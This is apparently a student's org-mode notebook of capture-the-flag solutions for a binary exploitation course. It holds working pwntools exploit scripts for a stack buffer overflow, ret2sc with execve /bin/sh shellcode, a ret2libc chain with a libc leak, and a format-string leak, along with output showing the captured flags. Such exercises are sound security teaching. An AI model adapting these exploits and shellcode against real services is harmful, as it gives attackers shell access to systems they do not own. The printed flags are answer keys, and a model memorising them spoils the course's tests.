* prac2
** bof
   simple buffer overflow return to function <www>
#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
payload = b'A' * (0x20 + 8)                                                                                                
from pwn import *
www = p64(0x400686)
host = "csie.ctf.tw"
port = 10125
r = remote(host, port)                                                                                                     
r.recvuntil(b":")
r.send(payload + www)
r.recvline()                                             
sleep(1)                                                 
r.sendline("cat /home/`whoami`/flag")                    
sleep(1)                                                 
f = r.recv().decode("ascii")
print(f)

#+END_SRC

#+RESULTS:
#+BEGIN_SRC org
[x] Opening connection to csie.ctf.tw on port 10125
[x] Opening connection to csie.ctf.tw on port 10125: Trying 140.112.31.96
[+] Opening connection to csie.ctf.tw on port 10125: Done
FLAG{vCa9cA1Gkp6BlV0ZrKIdHJlT8fabo6hE}

[*] Closed connection to csie.ctf.tw port 10125
#+END_SRC

** ret2sc
   no nx and no PIE, write shellcode to variable <name> , then use buffer overflow to return 
   to <name>
#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
from pwn import *
context.arch = "amd64"
shell = asm("""
call main
.ascii "/bin/sh"
.byte 0

main:
  mov rax, 59
  mov rdi, [rsp]
  mov rdx, 0
  mov rsi, 0
  syscall
""")
#shell = b'\xe8\x08\x00\x00\x00/bin/sh\x00H\xc7\xc0;\x00\x00\x00H\x8b<$H\xc7\xc6\x00\x00\x00\x00H\xc7\xc2\x00\x00\x00\x00\x0f\x05'
name = p64(0x601080)
payload = b"A" * 248
r = remote("csie.ctf.tw", 10126)
r.recvuntil(":")                                         
b'Name:'
r.sendline(shell)                                        
r.recvuntil(":")                                         
b'Try your best:'
r.sendline(payload + name)                                
sleep(1)                                                 
r.sendline("cat /home/`whoami`/flag")                    
sleep(1)                                                 
f = r.recv().decode("ascii")
print(f)
#+END_SRC

#+RESULTS:
#+BEGIN_SRC org
b'\xe8\x08\x00\x00\x00/bin/sh\x00H\xc7\xc0;\x00\x00\x00H\x8b<$H\xc7\xc2\x00\x00\x00\x00H\xc7\xc6\x00\x00\x00\x00\x0f\x05'
[x] Opening connection to csie.ctf.tw on port 10126
[x] Opening connection to csie.ctf.tw on port 10126: Trying 140.112.31.96
[+] Opening connection to csie.ctf.tw on port 10126: Done
FLAG{6EWQLMK1GDzMlV6vPFokzmtux4Fh42yJ}

[*] Closed connection to csie.ctf.tw port 10126
#+END_SRC

** ret2lib
#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
from pwn import *
r = remote("csie.ctf.tw", 10127)

puts_got = "601018" 
puts_off = 0x6f690
system_off = 0x45390  
binsh_off = 0x18cd17
payload = b"A" * 56

pop_rdi = p64(0x00400823)
ret = p64(0x00400541)

r.recvuntil(":")
r.sendline(puts_got)
r.recvuntil(":")
puts_addr = int(r.recvline().strip(), 16)
r.recvline()
libc_base = puts_addr - puts_off
system_addr = p64(libc_base + system_off)
binsh_addr = p64(libc_base + binsh_off)
exploit = flat([payload, pop_rdi, binsh_addr, system_addr,  ret])
r.sendline(exploit)
r.recv()
sleep(1)
r.sendline("cat /home/`whoami`/flag")
sleep(1)
f = r.recv().decode("ascii")
print(f)

#+END_SRC

#+RESULTS:
#+BEGIN_SRC org
[x] Opening connection to csie.ctf.tw on port 10127
[x] Opening connection to csie.ctf.tw on port 10127: Trying 140.112.31.96
[+] Opening connection to csie.ctf.tw on port 10127: Done
FLAG{O66cJwwT8lKl1oKhUG8DcwZxTSwnLaHu}

[*] Closed connection to csie.ctf.tw port 10127
#+END_SRC
** format
#+BEGIN_SRC python :results org output :python  ~/pyenv/bin/python3 :exports both
from pwn import *
fmt = "%67$p"
r = remote("csie.ctf.tw", 10128)
r.recvuntil(" = ")
r.sendline(fmt)
p = int(r.recvline().split()[-1], 16)
r.recvuntil(" = ")
r.sendline(str(p))
r.recvline()
f = r.recvline()
print(f)
#+END_SRC

#+RESULTS:
#+BEGIN_SRC org
[x] Opening connection to csie.ctf.tw on port 10128
[x] Opening connection to csie.ctf.tw on port 10128: Trying 140.112.31.96
[+] Opening connection to csie.ctf.tw on port 10128: Done
b'FLAG{__format_str_exploit_OUO}\n'
[*] Closed connection to csie.ctf.tw port 10128
#+END_SRC
